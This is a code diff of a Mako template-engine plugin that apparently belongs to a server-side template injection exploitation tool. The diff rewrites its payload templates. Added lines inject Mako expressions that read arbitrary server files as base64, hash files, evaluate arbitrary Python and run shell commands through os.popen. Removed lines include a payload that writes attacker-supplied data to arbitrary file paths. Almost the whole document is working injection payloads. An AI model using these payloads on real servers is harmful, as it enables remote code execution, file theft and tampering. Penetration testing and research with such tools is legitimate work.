@@ -1,10 +1,10 @@
 from core import languages
-from core.plugin import Plugin
+from plugins.languages import python
 from utils.loggers import log
 from utils import rand
 import re
 
-class Mako(Plugin):
+class Mako(python.Python):
     
     def init(self):
 
@@ -12,31 +12,19 @@ class Mako(Plugin):
             'render' : {
                 'render': '${%(code)s}',
                 'header': '${%(header)s}',
-                'trailer': '${%(trailer)s}',
-                'render_test': """'%(s1)s'.join('%(s2)s')""" % { 
-                    's1' : rand.randstrings[0], 
-                    's2' : rand.randstrings[1]
-                },
-                'render_expected': '%(res)s' % { 
-                    'res' : rand.randstrings[0].join(rand.randstrings[1])
-                }
-            },
-            'write' : {
-                'call' : 'evaluate',
-                'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk_b64)s'))""",
-                'truncate' : """open("%(path)s", 'w').close()"""
+                'trailer': '${%(trailer)s}'
             },
             'read' : {
                 'call': 'render',
-                'read' : """<%% x=__import__("base64").b64encode(open("%(path)s", "rb").read()) %%>${x}"""
+                'read' : """${__import__("base64").b64encode(open("%(path)s","rb").read())}"""
             },
             'md5' : {
                 'call': 'render',
-                'md5': """<%% x=__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest() %%>${x}"""
+                'md5': """${__import__("hashlib").md5(open("%(path)s",'rb').read()).hexdigest()}"""
             },
             'evaluate' : {
                 'call': 'render',
-                'evaluate': '<%% %(code)s %%>'
+                'evaluate': '${ %(code)s }'
             },
             'blind' : {
                 'call': 'evaluate_blind',
@@ -61,7 +49,7 @@ class Mako(Plugin):
             },
             'execute' : {
                 'call' : 'render',
-                'execute' : """<%% x=__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read() %%>${x}"""
+                'execute' : """${__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()}"""
             }
 
         })
@@ -90,8 +78,6 @@ class Mako(Plugin):
             { 'level': 5, 'prefix' : '</%%text>', 'suffix' : '<%%text>', 'closures' : languages.python_ctx_closures},
 
         ])
-
-    language = 'python'
 
     def rendered_detected(self):
 
